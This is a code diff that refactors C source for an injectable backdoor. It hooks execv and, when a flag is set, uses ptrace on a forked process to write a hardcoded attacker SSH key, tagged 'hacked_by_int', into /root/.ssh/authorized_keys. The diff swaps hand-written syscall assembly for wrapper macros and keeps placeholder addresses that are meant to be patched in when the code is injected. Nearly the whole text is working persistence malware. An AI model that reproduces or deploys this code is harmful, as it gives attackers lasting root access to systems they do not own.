@@ -1,11 +1,16 @@
-// clang-format off
-#include <sys/user.h>
+#include "syscall_define.h"
 #include <netinet/in.h>
+#include <stdint.h>
+#include <sys/cdefs.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/user.h>
+#include <syscall.h>
+#include <unistd.h>
+
+// clang-format off
 #include <sys/ptrace.h>
 #include <linux/ptrace.h>
-#include <stdint.h>
-#include <sys/types.h>
-#include <unistd.h>
 
 #define SSH_AUTH_PATH "/root/.ssh/authorized_keys"
 #define SSH_PUBKEY "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFiXeDYmT1LhJZC5/dTl1VRgAHy1WkE/NyovkF4mFtPe hacked_by_int\n"
@@ -13,14 +18,9 @@
 
 void set_my_pubkey (uint32_t pid);
 
-uint32_t *get_backdoor_location ();
-
-uint64_t sys_ptrace (enum __ptrace_request op, pid_t pid, void *addr,
-                     void *data);
+void sys_ptrace (enum __ptrace_request op, pid_t pid, void *addr, void *data);
 
 void sys_wait (uint32_t pid);
-
-int sys_open (const char *path, int flags);
 
 void sys_exit ();
 
@@ -28,7 +28,7 @@ int sys_fork ();
 
 void sys_write (int fd, char *buf, uint32_t size);
 
-void call_execv (const char *path, char *const argv[]);
+__attribute_noinline__ void call_execv (const char *path, char *const argv[]);
 
 void copy_to_tracee (uint32_t pid, uint64_t addr, uint8_t *data, uint32_t len);
 
@@ -52,10 +52,15 @@ void set_regs (uint32_t pid, struct user_regs_struct *regs);
 
 void get_regs (uint32_t pid, struct user_regs_struct *regs);
 
-void
+__attribute_noinline__ void *get_rw_addr ();
+
+__attribute_noinline__ void execv_hook (const char *path, char *const argv[]);
+
+__attribute_noinline__ void
 execv_hook (const char *path, char *const argv[])
 {
-  if (*get_backdoor_location() != 16)
+  uint32_t *backdoor_flag = get_rw_addr ();
+  if (*backdoor_flag != 16)
     call_execv (path, argv);
 
   uint32_t pid;
@@ -112,53 +117,43 @@ set_my_pubkey (uint32_t pid)
   // set the correct size just in case
 }
 
-uint32_t *
-get_backdoor_location ()
-{
-  asm ("mov rax, 0x123456789abc");
-}
-
 void
 sys_write (int fd, char *buf, uint32_t size)
 {
-  asm ("push 0x1; pop rax; syscall");
+  syscall3 (SYS_write, fd, (uint64_t)buf, size);
 }
 
-uint64_t
+void
 sys_ptrace (enum __ptrace_request op, pid_t pid, void *addr, void *data)
 {
-  asm ("push rcx; pop r10; push 0x65; pop rax; syscall");
+  syscall4 (SYS_ptrace, op, pid, (uint64_t)addr, (uint64_t)data);
 }
 
 void
 sys_wait (uint32_t pid)
 {
-  asm (
-      "xor rsi, rsi; xor rdx, rdx; xor r10, r10; push 0x3d; pop rax; syscall");
-}
-
-int
-sys_open (const char *path, int flags)
-{
-  asm ("push 0x2; pop rax; syscall");
+  syscall4 (SYS_wait4, pid, 0, 0, 0);
 }
 
 void
 sys_exit ()
 {
-  asm ("xor rdi, rdi; push 0x3c; pop rax; syscall");
+  syscall1 (SYS_exit, 0);
 }
 
 int
 sys_fork ()
 {
-  asm ("push 0x39; pop rax; syscall");
+  return syscall0 (SYS_fork);
 }
 
-void
+__attribute_noinline__ void
 call_execv (const char *path, char *const argv[])
 {
-  asm ("mov rax, 0x23456789abcd; call rax");
+  __asm__ volatile ("mov rax, 0x123456789abcdef0; call rax"
+                    :
+                    : "rdi"(path), "rsi"(argv)
+                    :);
 }
 
 void
@@ -244,7 +239,16 @@ get_regs (uint32_t pid, struct user_regs_struct *regs)
   sys_ptrace (PTRACE_GETREGS, pid, NULL, regs);
 }
 
+__attribute_noinline__ void *
+get_rw_addr ()
+{
+  void *ret;
+  __asm__ volatile ("mov rax, 0x0123456789abcdef" : "=a"(ret));
+  return ret;
+}
+
 void
 _start ()
 {
+  execv_hook (0, 0);
 }
